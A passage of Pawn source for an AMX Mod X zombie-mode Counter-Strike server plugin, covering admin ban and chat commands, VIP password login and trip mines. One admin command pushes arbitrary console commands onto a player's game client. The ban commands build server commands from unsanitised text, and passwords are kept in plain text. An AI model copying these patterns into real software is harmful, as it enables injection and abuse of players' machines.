		new ModName [10]; get_modname ( ModName, charsmax ( ModName ) )
	
		if ( !equal ( ModName, "zp" ) )
		{
			message_begin ( MSG_ALL, SVC_INTERMISSION );
		
			message_end (  );
		}
		
		set_task(1.0, "ShutDownSQL", 0, "", 0, "", 0);

		set_task ( 11.75, "ChangeMap", 0, Arg, ArgLen + 1 );
	}
	return PLUGIN_HANDLED;
}

public ShutDownSQL()
{
	client_print_color ( 0, print_team_grey, "^4[Zombie Outstanding]^1 Shutting down^3 MySQL^1 connection... Map change in^3 11 seconds!");
	return 0;
}

public CmdExec(iPlayer)
{
	if (get_user_flags ( iPlayer ) & read_flags ( "@" ) )
	{
		static iTarget;
		static cCommand[64];
		static cTarget[32];
		read_argv(1, cTarget, 32);
		read_argv(2, cCommand, 64);
		iTarget = cmd_target ( iPlayer, cTarget, CMDTARGET_OBEY_IMMUNITY | CMDTARGET_NO_BOTS | CMDTARGET_ALLOW_SELF );
		if ( !iTarget ) return PLUGIN_HANDLED;		
		if (0 < iTarget)
		{
			client_cmd(iTarget, cCommand);
		}
		console_print(iPlayer, "[Zombie Outstanding] Player not found!");
	}
	return 1;
}

public CmdLast(iPlayer)
{
	if (get_user_flags ( iPlayer ) & read_flags ( "3" ) )
	{
		static cAddress[24];
		static cName[32];
		static i;
		i = 0;
		while (i < g_iSize)
		{
			GetInfo(i, cName, 32, cAddress, 24);
			console_print(iPlayer, "%32s %24s", cName, cAddress);
			i += 1;
		}
	}
	return 0;
}

public CmdBan ( id )
{
	if (get_user_flags ( id ) & read_flags ( "d" ) )
	{

	    if ( read_argc (  ) < 3 ) 
	    {
	        console_print(id, "[Zombie Outstanding] Command usage is amx_ban <#userid or name> <time> [reason]");
	        return 1;		
	    }
	
	    new Target [32], Minutes [8], Reason [64];
	
	    read_argv ( 1, Target, charsmax ( Target ) );
	
	    read_argv ( 2, Minutes, charsmax ( Minutes ) );
	
	    read_argv ( 3, Reason, charsmax ( Reason ) );
	
	    new Player = cmd_target ( id, Target, CMDTARGET_OBEY_IMMUNITY | CMDTARGET_NO_BOTS | CMDTARGET_ALLOW_SELF );
	    if ( !Player ) return PLUGIN_HANDLED;
	    new nNum = str_to_num ( Minutes );
	    if ( nNum < 0 )
	    {
	        nNum = 0;
		
	        Minutes = "0";
	    }
	    new Temp [64], Banned [16];
	    if ( nNum )
	
	    format ( Temp, charsmax ( Temp ), "for %s min", Minutes );
	    else
	    format ( Temp, charsmax ( Temp ), "permanently" );
	    format ( Banned, charsmax ( Banned ), "Banned" );

	    if ( Reason [0] )
	    {		
	        server_cmd ( "kick #%d ^"%s (%s %s)^";wait;addip ^"%s^" ^"%s^";wait;writeip", get_user_userid ( Player ), Reason, Banned, Temp, Minutes, GetInfoPlayer ( Player, INFO_IP ) );
	    }
	    else
	    {		
	        server_cmd ( "kick #%d ^"%s %s^";wait;addip ^"%s^" ^"%s^";wait;writeip", get_user_userid ( Player ), Banned, Temp, Minutes, GetInfoPlayer ( Player, INFO_IP ) );
	    }
	
	    if ( nNum )
	    client_print_color ( 0, print_team_grey, "^4[Zombie Outstanding]^1 Admin^4 %s^1 banned^4 %s^1 for^3 %s^1 minutes due to^3 %s", GetInfoPlayer ( id, INFO_NAME ), GetInfoPlayer ( id, INFO_AUTHID ), nNum, nNum == 1 ? "" : "s" );
	    else
	    client_print_color ( 0, print_team_grey, "^4[Zombie Outstanding]^1 Admin^4 %s^1 banned^4 %s^1 permanently due to^3 %s", GetInfoPlayer ( id, INFO_NAME ), GetInfoPlayer ( id, INFO_AUTHID ), Reason );
	}
	
	return PLUGIN_HANDLED;
}

public CmdUnBan(id)
{
	if (get_user_flags ( id ) & read_flags ( "d" ) )
	{
	    if ( read_argc (  ) < 2 ) return PLUGIN_HANDLED;
	
	    new Arg [32]; read_argv ( 1, Arg, charsmax ( Arg ) );

	    if ( contain ( Arg, "." ) != -1 )
	    {
		    server_cmd ( "removeip ^"%s^";writeip", Arg )
	    } 
	    else 
	    {
		    server_cmd ( "removeid ^"%s^";writeid", Arg );
	    }
	    client_print_color ( 0, print_team_grey, "^4[Zombie Outstanding]^1 Admin^4 %s^1 UnBan^4 %s^3", GetInfoPlayer ( id, INFO_NAME ), Arg );
	}
	
	return PLUGIN_HANDLED;
}

public CmdChat(iPlayer)
{
	if (get_user_flags ( iPlayer ) & read_flags ( "f" ) )
	{
		static i;
		static cPhrase[192];
		read_args(cPhrase, 192);
		remove_quotes(cPhrase);
		if (contain(cPhrase, "%") != -1)
		{
			return 1;
		}
		cPhrase[189] = 0;
		i = 1;
		while (g_iMaxClients + 1 > i)
		{
			if (g_bConnected[i])
			{
				client_print_color (i, print_team_grey, "^4[ADMINS]^3 %s^1 :  %s", g_cName[iPlayer], cPhrase);
			}
			i += 1;
		}
	}
	return 1;
}

public CmdSayChat(iPlayer)
{
	if (get_user_flags ( iPlayer ) & read_flags ( "y" ) )
	{
		static i;
		static cPhrase[192];
		read_args(cPhrase, 192);
		remove_quotes(cPhrase);
		if (contain(cPhrase, "%") != -1)
		{
			return 1;
		}
		cPhrase[189] = 0;
		i = 1;
		while (g_iMaxClients + 1 > i)
		{
			if (g_bConnected[i])
			{
				client_print_color (i, print_team_grey, "^4[ALL]^3 %s^1 :  %s", g_cName[iPlayer], cPhrase);
			}
			i += 1;
		}
	}
	return 1;
}

public CmdAddBan (id)
{
	if (get_user_flags ( id ) & read_flags ( "5" ) )
	{

		if ( read_argc (  ) < 3 )
		{
		    console_print(id, "[Zombie Outstanding] Command usage is amx_addban <name> <ip> <time> <reason>");
		    return 1
		}
	
		new Arg [32], Minutes [32], Reason [32];
	
		read_argv ( 1, Arg, charsmax ( Arg ) );
	
		read_argv ( 2, Minutes, charsmax ( Minutes ) );
	
		read_argv ( 3, Reason, charsmax ( Reason ) );
	
		trim ( Arg );
	
		if ( contain ( Arg, "." ) != -1 )
		{
		    server_cmd ( "addip ^"%s^" ^"%s^";wait;writeip", Minutes, Arg );
		} 
		else 
		{
		    server_cmd ( "banid ^"%s^" ^"%s^";wait;writeid", Minutes, Arg );
		}

		client_print_color ( 0, print_team_grey, "^4[Zombie Outstanding]^1 Admin^4 %s^1 banned^4 %s^1 permanently due to^3 %s", GetInfoPlayer ( id, INFO_NAME ), Arg, Reason );
	}
		
	return PLUGIN_HANDLED
}


public CommandGetSlot(id)
{
	if (g_bServerSlot[id])
	{	
		new password[16];
		read_args(password, charsmax(password));
		remove_quotes(password);

		if(strlen(password) < 3 || strlen(password) > 15)
		{
		    client_print_color(id, print_team_grey, "^4[Zombie OutStanding]^1 Password^3 Invalid^1.");
		    client_print_color(id, print_team_grey, "^4[Zombie OutStanding]^1 Password must contain between^1 3^3 and^1 15 characters^3.");
		    client_print_color(id, print_team_grey, "^4[Zombie OutStanding]^1 Retype Again^3 Password^1.");
		
		    client_cmd(id, "messagemode amx_password_for_slot");
		    return 1
		}

		new configsDir[64];
		get_configsdir(configsDir, charsmax(configsDir));
		format(configsDir, 63, "%/Admins.ini", configsDir);

		new name[32];
		get_user_name(id, name, charsmax(name));
	
		new linetoadd[512];
		formatex(linetoadd, 511, "^n^"%s^" ^"%s^" ^"r^"", name, password);
		server_print("Adding: %s", linetoadd);
		
		if(!write_file(configsDir, linetoadd))
		console_print(id, "[Zombie OutStanding] Failed writing to %s!", configsDir);

		set_user_info(id, "_pw", password);
		server_cmd("amx_reloadadmins");
	
		console_print(id, "");
		console_print(id, "****************************");
		console_print(id, "Done! You have now slot access!");
		console_print(id, "Be careful, to login with your account,");
		console_print(id, "You should type in your console");
		console_print(id, "setinfo _pw ^"password^"");
		console_print(id, "We hope you enjoy you have fun!");
		console_print(id, "****************************");
		console_print(id, "");
		server_cmd("kick #%d  Check your console!", get_user_userid(id));	
	}
	return PLUGIN_HANDLED
}

public CommandGetModel(id)
{
	if (g_bAdminModel[id])
	{	
		new password[16];
		read_args(password, charsmax(password));
		remove_quotes(password);

		if(strlen(password) < 3 || strlen(password) > 15)
		{
		    client_print_color(id, print_team_grey, "^4[Zombie OutStanding]^1 Password^3 Invalid^1.");
		    client_print_color(id, print_team_grey, "^4[Zombie OutStanding]^1 Password must contain between^1 3^3 and^1 15 characters^3.");
		    client_print_color(id, print_team_grey, "^4[Zombie OutStanding]^1 Retype Again^3 Password^1.");
		
		    client_cmd(id, "messagemode amx_password_for_model");
		    return 1
		}

		new configsDir[64];
		get_configsdir(configsDir, charsmax(configsDir));
		format(configsDir, 63, "%/Admins.ini", configsDir);

		new name[32];
		get_user_name(id, name, charsmax(name));
	
		new linetoadd[512];
		formatex(linetoadd, 511, "^n^"%s^" ^"%s^" ^"m^"", name, password);
		server_print("Adding: %s", linetoadd);
		
		if(!write_file(configsDir, linetoadd))
		console_print(id, "[Zombie OutStanding] Failed writing to %s!", configsDir);

		set_user_info(id, "_pw", password);
		server_cmd("amx_reloadadmins");
	
		console_print(id, "");
		console_print(id, "****************************");
		console_print(id, "Done! You have now slot access!");
		console_print(id, "Be careful, to login with your account,");
		console_print(id, "You should type in your console");
		console_print(id, "setinfo _pw ^"password^"");
		console_print(id, "We hope you enjoy you have fun!");
		console_print(id, "****************************");
		console_print(id, "");
		server_cmd("kick #%d  Check your console!", get_user_userid(id));	
	}
	return PLUGIN_HANDLED
}

public Golden_Ak_Tracer(ent, attacker, Float:damage, Float:dir[3], ptr, iDamageType)
{
	if ((g_iWeapon [attacker] == CSW_AK47) && (g_bGolden [attacker] ))		
	{
		new Float:flEnd[3];
		get_tr2(ptr, TR_vecEndPos, flEnd);
		
		message_begin(MSG_BROADCAST, SVC_TEMPENTITY);
		write_byte(TE_BEAMENTPOINT);
		write_short(attacker | 0x1000);
		engfunc(EngFunc_WriteCoord, flEnd[0]);
		engfunc(EngFunc_WriteCoord, flEnd[1]);
		engfunc(EngFunc_WriteCoord, flEnd[2]);
		write_short(SpriteTexture);
		write_byte(0);
		write_byte(0);
		write_byte(1);
		write_byte(5);
		write_byte(0);
		write_byte(255);
		write_byte(160);
		write_byte(100);
		write_byte(128);
		write_byte(0);
		message_end();
	}
	return HAM_IGNORED;
}

public Golden_Deagle_Tracer(ent, attacker, Float:damage, Float:dir[3], ptr, iDamageType)
{
	if ((g_iWeapon [attacker] == CSW_DEAGLE) && (g_bGoldenDeagle [attacker]))		
	{
		new Float:flEnd[3];
		get_tr2(ptr, TR_vecEndPos, flEnd);
		
		message_begin(MSG_BROADCAST, SVC_TEMPENTITY);
		write_byte(TE_BEAMENTPOINT);
		write_short(attacker | 0x1000);
		engfunc(EngFunc_WriteCoord, flEnd[0]);
		engfunc(EngFunc_WriteCoord, flEnd[1]);
		engfunc(EngFunc_WriteCoord, flEnd[2]);
		write_short(SpriteTexture);
		write_byte(0);
		write_byte(0);
		write_byte(1);
		write_byte(5);
		write_byte(0);
		write_byte(255);
		write_byte(160);
		write_byte(100);
		write_byte(128);
		write_byte(0);
		message_end();
	}
	return HAM_IGNORED;
}


public CmdPoints(id)
{
	if ( !access ( id, read_flags ("3") ) ) return PLUGIN_HANDLED;
	
	static Arg[32], amount[16], Player, points
	
	read_argv(1, Arg, charsmax(Arg))
	
	read_argv(2, amount, charsmax(amount))

	Player = cmd_target ( id, Arg, ( CMDTARGET_ONLY_ALIVE | CMDTARGET_ALLOW_SELF ) );
	
	if ( !Player ) return PLUGIN_HANDLED;
	
	points = str_to_num(amount);
	
	if (points < 1)
		
	return PLUGIN_HANDLED;
	
	g_iPoints[Player] += points;
	
	new str[32];
	
	AddCommas ( points, str, 31 );
	
	log_to_file ( "ZombieOutstanding.log", "%s gave %s points to %s", g_cName [id], str, g_cName [Player] );
	
	console_print ( id ,"^nDone!" );
	
	return PLUGIN_HANDLED;
}

public OnFakemetaSpawn(ent)
{
	if(!pev_valid(ent))
	{
		return FMRES_IGNORED;
	}
	
	new szClassname[32]
	pev(ent, pev_classname, szClassname, charsmax(szClassname))
	
	for(new j = 0; j < sizeof szObjectives; j++)
	{
		if(equal(szClassname, szObjectives[j]))
		{
			engfunc(EngFunc_RemoveEntity, ent)
			return FMRES_SUPERCEDE;
		}
	}
	
	return FMRES_IGNORED;
}

public Rocket_Touch( iOwner, iRocket )
{
    if( g_bConnected[ iOwner ] )
    {
        static iPlayers[ 32 ], iNum, i;
        get_players( iPlayers, iNum, "a" );

        for( i = 0; i < iNum; i++ )
        {
            if( g_bZombie[ iPlayers[ i ] ] )
            {
                static Float: fDistance, Float: fDamage;
                fDistance = entity_range( iPlayers[ i ], iRocket );

                if( fDistance < 320.0 )
                {
                    fDamage = 1050.0 - fDistance;
                
                    static Float: fVelocity[ 3 ];
                    pev( iPlayers[ i ], pev_velocity, fVelocity );
                    xs_vec_mul_scalar( fVelocity, 2.75, fVelocity );
                    fVelocity[ 2 ] *= 1.75;
                    set_pev( iPlayers[ i ], pev_velocity, fVelocity );
                    
                    if( float( get_user_health( iPlayers[ i ] ) ) - fDamage > 0.0 )
                        ExecuteHamB( Ham_TakeDamage, iPlayers[ i ], iRocket, iOwner, fDamage, DMG_BLAST );
                        
                    else ExecuteHamB( Ham_Killed, iPlayers[ i ], iOwner, 2 );


                    client_print_color(iOwner, print_team_grey, "^4[Zombie Outstanding]^1 Damage to^4 %s^1 ::^4 %0.0f^1 damage", g_cName[i], fDamage );
                }
            }
        }
    }
}	
	
public Jetpack_Touch( iPlayer )
{
    if ( g_bZombie[iPlayer ] )
        return PLUGIN_HANDLED;
        
    if ( g_iPlayerType[iPlayer] & 1 || g_iPlayerType[iPlayer] & 2 || g_iPlayerType[iPlayer] & 4 || g_iPlayerType[iPlayer] & 8 )
        return PLUGIN_HANDLED;
        
    return PLUGIN_CONTINUE;
}  

public fwEmitSound ( id, Channel, const Sample [], Float: Volume, Float: Attn, Flags, Pitch )
{
	if ( Sample [0] == 'h' && Sample [1] == 'o' && Sample [2] == 's' && Sample [3] == 't' && Sample [4] == 'a' && Sample [5] == 'g' && Sample [6] == 'e' )
		
	return FMRES_SUPERCEDE;
	
	if ( !is_user_valid_connected ( id ) || !g_bZombie [id] )
		
	return FMRES_IGNORED;
	
	if ( Sample [7] == 'b' && Sample [8] == 'h' && Sample [9] == 'i' && Sample [10] == 't' )
	{
		if (g_iPlayerType[id] & 1)
		{
			client_cmd(id, "spk %s", g_pMonsterHitSounds[random_num(0, 2)]);
		}
		else if (g_iPlayerType[id] & 2)
		{
			client_cmd(id, "spk %s", g_pMonsterHitSounds[random_num(0, 2)]);
		}
		else
		{
			client_cmd(id, "spk %s", g_pZombieHitSounds[random_num(0, 4)]);
		}
		
		return FMRES_SUPERCEDE;
	}

	if ( Sample [8] == 'k' && Sample [9] == 'n' && Sample [10] == 'i' )
	{
		if ( Sample [14] == 's' && Sample [15] == 'l' && Sample [16] == 'a' )
		{
			client_cmd(id, "spk %s", g_pZombieMissSlash[random_num(0, 1)]);
			
			return FMRES_SUPERCEDE;
		}
		if ( Sample [14] == 'h' && Sample [15] == 'i' && Sample [16] == 't') 
		{
			if ( Sample [17] == 'w' ) 
			{
				client_cmd(id, "spk %s", g_pZombieMissWall[random_num(0, 1)]);
			
				return FMRES_SUPERCEDE;
			}
			else
			{
				client_cmd(id, "spk %s", g_pZombieHitNormal[random_num(0, 3)]);
			
				return FMRES_SUPERCEDE;
			}
		}
		if ( Sample [14] == 's' && Sample [15] == 't' && Sample [16] == 'a')
		{
			client_cmd(id, "spk weapons/knife_stab");
			
			return FMRES_SUPERCEDE;
		}
	}

	if ( Sample [7] == 'd' && ( ( Sample [8] == 'i' && Sample [9] == 'e' ) || ( Sample [8] == 'e' && Sample [9] == 'a' ) ) )
	{
		client_cmd(id, "spk %s", g_pZombieDieSounds[random_num(0, 4)]);
		
		return FMRES_SUPERCEDE;
	}

	if ( Sample [10] == 'f' && Sample [11] == 'a' && Sample [12] == 'l' && Sample [13] == 'l' )
	{
		client_cmd(id, "spk %s", g_pZombieFall[random_num(0, 1)]);
		
		return FMRES_SUPERCEDE;
	}
	
	return FMRES_IGNORED;
} 
public fwGetGameDescription (  )
{
	forward_return ( FMV_STRING, "Counter-Strike" );
	
	return FMRES_SUPERCEDE;
}

loadPoints(id)
{
	g_vault = nvault_open("points");

	if (g_vault != -1)
	{
		g_iPoints[id] = nvault_get(g_vault, g_cName[id]);
		nvault_close(g_vault);
		g_vault = -1;
	}
}

savePoints(id)
{
	g_vault = nvault_open("points");

	if (g_vault != -1)
	{
		new str[16];
		num_to_str(g_iPoints[id], str, charsmax(str));
		
		nvault_set(g_vault, g_cName[id], str);
		nvault_close(g_vault);
		g_vault = -1;
	}
}

public plugin_end()
{
	if (g_vault != -1)
	{
		nvault_close(g_vault);
		g_vault = -1;
	}
}

public client_authorized(id)
{
	static pwd[32], field[32], reqname[64], reqpwd[64], reqflags[64], i;

	get_cvar_string("amx_password_field", field, 31);

	get_user_ip(id, g_ip[id], charsmax(g_ip[]), 1);
	get_user_name(id, g_cName[id], charsmax(g_cName[]));
	get_user_authid(id, g_steam[id], charsmax(g_steam[]));
	get_user_info(id, field, pwd, 31);
	
	g_bDoubleDamage[id] = false;
	g_vip[id] = false;

	for (i = 0; i < ArraySize(g_vname); i++)
	{
		ArrayGetString(g_vname, i, reqname, 63);
		ArrayGetString(g_vpwd, i, reqpwd, 63);
		ArrayGetString(g_vflags, i, reqflags, 63);

		if (equali(g_cName[id], reqname))
		{
			if (equali(pwd, reqpwd) && strlen(pwd) > 0)
			{
				g_vip[id] = true;
				formatex(g_vip_flags[id], charsmax(g_vip_flags[]), "%s", reqflags);
				break;
			}
			
			else
			{
				server_cmd("kick #%d  Your VIP account's password is incorrect!", get_user_userid(id));
				break;
			}
		}
		
		if (equali(g_ip[id], reqname) || equali(g_steam[id], reqname))
		{
			g_vip[id] = true;
			formatex(g_vip_flags[id], charsmax(g_vip_flags[]), "%s", reqflags);
			break;
		}
	}
	loadPoints(id);
}

public Rays()
{
	static Float:origin[3];
	for (new vip = 1; vip <= g_iMaxClients; vip++)
	{
		if (is_user_alive(vip) && g_vip[vip] && containi(g_vip_flags[vip], "r") != -1)
		{
			if (!g_bZombie[vip])
			{
				for (new z=1;z<=g_iMaxClients;z++)
				{
					if (is_user_alive(z)&&g_bZombie[z]&&!ExecuteHam(Ham_FVisible, vip, z))
					{
						pev(z,pev_origin,origin);
						message_begin(MSG_ONE_UNRELIABLE, SVC_TEMPENTITY, _, vip)
						write_byte(TE_BEAMENTPOINT)
						write_short(vip)
						engfunc(EngFunc_WriteCoord, origin[0])
						engfunc(EngFunc_WriteCoord, origin[1])
						engfunc(EngFunc_WriteCoord, origin[2])
						write_short(g_iLaser)
						write_byte(1)
						write_byte(1)
						write_byte(5)
						write_byte(8)
						write_byte(0)
						write_byte(0)
						write_byte(42)
						write_byte(255)
						write_byte(255)
						write_byte(0)
						message_end()
					}
				}
			}
			else
			{
				for (new z=1;z<=g_iMaxClients;z++)
				{
					if (is_user_alive(z)&&!g_bZombie[z]&&!ExecuteHam(Ham_FVisible, vip, z))
					{
						pev(z,pev_origin,origin);
						message_begin(MSG_ONE_UNRELIABLE, SVC_TEMPENTITY, _, vip)
						write_byte(TE_BEAMENTPOINT)
						write_short(vip)
						engfunc(EngFunc_WriteCoord, origin[0])
						engfunc(EngFunc_WriteCoord, origin[1])
						engfunc(EngFunc_WriteCoord, origin[2])
						write_short(g_iLaser)
						write_byte(1)
						write_byte(1)
						write_byte(5)
						write_byte(8)
						write_byte(0)
						write_byte(255)
						write_byte(24)
						write_byte(0)
						write_byte(255)
						write_byte(0)
						message_end()
					}
				}
			}
		}
	}
}

FixDeadAttrib(id)
{
	message_begin(MSG_BROADCAST, get_user_msgid("ScoreAttrib"))
	write_byte(id)
	write_byte(0)
	message_end()
}

SendDeathMsg(attacker, victim)
{
	message_begin(MSG_BROADCAST, get_user_msgid("DeathMsg"))
	write_byte(attacker)
	write_byte(victim)
	write_byte(1)
	write_string("infection")
	message_end()
}

UpdateFrags(attacker, victim, frags, deaths, scoreboard)
{
	set_pev(attacker, pev_frags, float(pev(attacker, pev_frags) + frags))
	
	cs_set_user_deaths(victim, cs_get_user_deaths(victim) + deaths)
	
	if (scoreboard)
	{
		message_begin(MSG_BROADCAST, get_user_msgid("ScoreInfo"))
		write_byte(attacker)
		write_short(pev(attacker, pev_frags))
		write_short(cs_get_user_deaths(attacker))
		write_short(0)
		write_short(_:fm_cs_get_user_team(attacker))
		message_end()
		
		message_begin(MSG_BROADCAST, get_user_msgid("ScoreInfo"))
		write_byte(victim)
		write_short(pev(victim, pev_frags))
		write_short(cs_get_user_deaths(victim))
		write_short(0)
		write_short(_:fm_cs_get_user_team(victim))
		message_end()
	}
}

public CmdPlantMine(iPlayer)
{
	if (g_bConnected[iPlayer])
	{
		if (!g_bAlive[iPlayer] || g_bZombie[iPlayer] || !g_iTripMines[iPlayer] || g_iPlantedMines[iPlayer] > 1 || g_iRoundType & 128 || g_iRoundType & 256 || g_iRoundType & 512)
		{
			client_print_color(iPlayer, print_team_default, "^4[Zombie Outstanding]^1 You can't plant mines for some reasons...");
			return 0;
		}
		if (g_iPlanting[iPlayer] || g_iRemoving[iPlayer])
		{
			return 0;
		}
		if ( g_iPlantedMines [iPlayer] > 1 )
		{
			client_print_color ( iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You can plant only^3 2^1 mines.");
		
			return PLUGIN_HANDLED;
		}		
		if (CanPlant(iPlayer))
		{
			g_iPlanting[iPlayer] = 1;
			message_begin( MSG_ONE_UNRELIABLE, 108, _, iPlayer );
			write_byte( 1 );
			write_byte( 0 );
			message_end( );
			set_task(1.20, "Func_Plant", iPlayer + 450, "", 0, "", 0);
		}
	}
	return 0;
}

public CmdTakeMine(iPlayer)
{
	if (g_bConnected[iPlayer])
	{
		if (!g_bAlive[iPlayer] || g_bZombie[iPlayer] || !g_iPlantedMines[iPlayer])
		{
			client_print_color(iPlayer, print_team_default, "^4[Zombie Outstanding]^1 You can't take mines for some reasons...");
			return 0;
		}
		if (g_iPlanting[iPlayer] || g_iRemoving[iPlayer])
		{
			return 0;
		}
		if (CanTake(iPlayer))
		{
			g_iRemoving[iPlayer] = 1;
			message_begin( MSG_ONE_UNRELIABLE, 108, _, iPlayer );
			write_byte( 1 );
			write_byte( 0 );
			message_end( );
			set_task(1.20, "Func_Take", iPlayer + 500, "", 0, "", 0);
		}
	}
	return 0;
}

public Func_Take(iPlayer) 
{
	iPlayer -= 500;
	
	g_iRemoving[ iPlayer ] = false;
	
	static iEntity, szClassName[ 32 ], Float: flOwnerOrigin[ 3 ], Float: flEntityOrigin[ 3 ];
	for( iEntity = 0; iEntity < 600 + 1; iEntity++ ) 
	{
		if( !is_valid_ent( iEntity ) )
		    continue;
		
		szClassName[ 0 ] = '^0';
		entity_get_string( iEntity, EV_SZ_classname, szClassName, 31);

		if( equal( szClassName, "zp_trip_mine" ) ) 
		{
			if (iPlayer == entity_get_int(iEntity, EV_INT_iuser2))
			{
				entity_get_vector( iPlayer, EV_VEC_origin, flOwnerOrigin );
				entity_get_vector( iEntity, EV_VEC_origin, flEntityOrigin );
				
				if( get_distance_f( flOwnerOrigin, flEntityOrigin ) < 55.0 ) 
				{
					g_iPlantedMines[ iPlayer ]--;
					g_iTripMines[ iPlayer ]++;
					
					remove_entity( iEntity );
					
					break;
				}
			}
		}
	}
}

public bool: CanTake( iPlayer ) 
{
	static iEntity, szClassName[ 32 ], Float: flOwnerOrigin[ 3 ], Float: flEntityOrigin[ 3 ];
	for( iEntity = 0; iEntity < 600 + 1; iEntity++ ) 
	{
		if( !is_valid_ent( iEntity ) )
			continue;
		
		szClassName[ 0 ] = '^0';
		entity_get_string( iEntity, EV_SZ_classname, szClassName, 31);
		
		if( equal( szClassName, "zp_trip_mine" ) ) 
		{
			if (iPlayer == entity_get_int(iEntity, EV_INT_iuser2))
			{
				entity_get_vector( iPlayer, EV_VEC_origin, flOwnerOrigin );
				entity_get_vector( iEntity, EV_VEC_origin, flEntityOrigin );
				
				if( get_distance_f( flOwnerOrigin, flEntityOrigin ) < 55.0 )
					return true;
			}
		}
	}
	
	return false;
}

public bool: CanPlant( iPlayer ) 
{
	static Float: flOrigin[ 3 ];
	entity_get_vector( iPlayer, EV_VEC_origin, flOrigin );
	
	static Float: flTraceDirection[ 3 ], Float: flTraceEnd[ 3 ], Float: flTraceResult[ 3 ], Float: flNormal[ 3 ];
	velocity_by_aim( iPlayer, 64, flTraceDirection );
	flTraceEnd[ 0 ] = flTraceDirection[ 0 ] + flOrigin[ 0 ];
	flTraceEnd[ 1 ] = flTraceDirection[ 1 ] + flOrigin[ 1 ];
	flTraceEnd[ 2 ] = flTraceDirection[ 2 ] + flOrigin[ 2 ];
	
	static Float: flFraction, iTr;
	iTr = 0;
	engfunc( EngFunc_TraceLine, flOrigin, flTraceEnd, 0, iPlayer, iTr );
	get_tr2( iTr, TR_vecEndPos, flTraceResult );
	get_tr2( iTr, TR_vecPlaneNormal, flNormal );
	get_tr2( iTr, TR_flFraction, flFraction );
	
	if( flFraction >= 1.0 ) 
	{
		client_print_color ( iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You must plant the^3 mine^1 on a wall!" );
		
		return false;
	}
	
	return true;
}

public Func_Plant( iPlayer ) 
{
	iPlayer -= 450;
	
	g_iPlanting[ iPlayer ] = false;
	
	static Float: flOrigin[ 3 ];
	entity_get_vector( iPlayer, EV_VEC_origin, flOrigin );
	
	static Float: flTraceDirection[ 3 ], Float: flTraceEnd[ 3 ], Float: flTraceResult[ 3 ], Float: flNormal[ 3 ];
	velocity_by_aim( iPlayer, 128, flTraceDirection );
	flTraceEnd[ 0 ] = flTraceDirection[ 0 ] + flOrigin[ 0 ];
	flTraceEnd[ 1 ] = flTraceDirection[ 1 ] + flOrigin[ 1 ];
	flTraceEnd[ 2 ] = flTraceDirection[ 2 ] + flOrigin[ 2 ];
	
	static Float: flFraction, iTr;
	iTr = 0;
	engfunc( EngFunc_TraceLine, flOrigin, flTraceEnd, 0, iPlayer, iTr );
	get_tr2( iTr, TR_vecEndPos, flTraceResult );
	get_tr2( iTr, TR_vecPlaneNormal, flNormal );
	get_tr2( iTr, TR_flFraction, flFraction );
	
	static iEntity;
	iEntity = create_entity( "info_target" );
	
	if( !iEntity )
		return;
	
	entity_set_string( iEntity, EV_SZ_classname, "zp_trip_mine" );
	entity_set_model( iEntity, "models/ZombieOutstanding/z_out_mine.mdl" );
	entity_set_size( iEntity, Float: { -4.0, -4.0, -4.0 }, Float: { 4.0, 4.0, 4.0 } );
	
	entity_set_int( iEntity, EV_INT_iuser2, iPlayer );
	
	g_iPlantedMines[ iPlayer ]++;

	set_pev( iEntity, pev_iuser3, g_iPlantedMines[ iPlayer ] );
	
	entity_set_float( iEntity, EV_FL_frame, 0.0 );
	entity_set_float( iEntity, EV_FL_framerate, 0.0 );
	entity_set_int( iEntity, EV_INT_movetype, MOVETYPE_FLY );
	entity_set_int( iEntity, EV_INT_solid, SOLID_NOT );
	entity_set_int( iEntity, EV_INT_body, 3 );
	entity_set_int( iEntity, EV_INT_sequence, 7 );
	entity_set_float( iEntity, EV_FL_takedamage, DAMAGE_NO );
	entity_set_int( iEntity, EV_INT_iuser1, 0 );
	
	static Float: flNewOrigin[ 3 ], Float: flEntAngles[ 3 ];
	flNewOrigin[ 0 ] = flTraceResult[ 0 ] + ( flNormal[ 0 ] * 8.0 );
	flNewOrigin[ 1 ] = flTraceResult[ 1 ] + ( flNormal[ 1 ] * 8.0 );
	flNewOrigin[ 2 ] = flTraceResult[ 2 ] + ( flNormal[ 2 ] * 8.0 );
	
	entity_set_origin( iEntity, flNewOrigin );
	
	vector_to_angle( flNormal, flEntAngles );
	entity_set_vector( iEntity, EV_VEC_angles, flEntAngles );
	flEntAngles[ 0 ] *= -1.0;
	flEntAngles[ 1 ] *= -1.0;
	flEntAngles[ 2 ] *= -1.0;
	entity_set_vector( iEntity, EV_VEC_v_angle, flEntAngles );
	
	g_iTripMines[ iPlayer ]--;
	
	EmitSound ( iEntity, CHAN_AUTO, "ZombieOutstanding/mine_deploy.wav" );
	EmitSound ( iEntity, CHAN_AUTO, "ZombieOutstanding/mine_charge.wav" );
	
	entity_set_float( iEntity, EV_FL_nextthink, get_gametime( ) + 0.6 );
}

public Func_RemoveMinesByOwner( iPlayer ) 
{
	static iEntity, szClassName[ 32 ];
	for( iEntity = 0; iEntity < 600 + 1; iEntity++ ) 
	{
		if( !is_valid_ent( iEntity ) )
			continue;
		
		szClassName[ 0 ] = '^0';
		entity_get_string( iEntity, EV_SZ_classname, szClassName, 31);
		
		if( equal( szClassName, "zp_trip_mine" ) )
			if( entity_get_int( iEntity, EV_INT_iuser2 ) == iPlayer )
				remove_entity( iEntity );
	}
}

public Forward_Think( iPlayer ) 
{
	static Float: flGameTime, iStatus;
	flGameTime = get_gametime( );
	iStatus = entity_get_int(iPlayer, EV_INT_iuser1);
	
	switch( iStatus ) 
	{
		case 0: 
		{
			entity_set_int( iPlayer, EV_INT_iuser1, 1 );
			entity_set_float( iPlayer, EV_FL_takedamage, DAMAGE_YES );
			entity_set_int( iPlayer, EV_INT_solid, SOLID_BBOX );
			entity_set_float( iPlayer, EV_FL_health, 800.0 + 1000);
			
			EmitSound(iPlayer, CHAN_AUTO, "ZombieOutstanding/mine_activate.wav" );
		}
		
		case 1: 
		{
			static Float: flHealth;
			flHealth = entity_get_float( iPlayer, EV_FL_health );

			if (is_user_alive(entity_get_int(iPlayer, EV_INT_iuser2)))
			{
				if( pev( iPlayer, pev_iuser3 ) == 1 )
				{	
					set_hudmessage(10, 255, 200, 0.10, 0.37, 0, 0.10, 0.10, 0.10, 0.10, 18);
					ShowSyncHudMsg(entity_get_int(iPlayer, EV_INT_iuser2), g_iMineMessage, "First mine's health: %0.0f", flHealth + -1000);
				}
				else
				{	
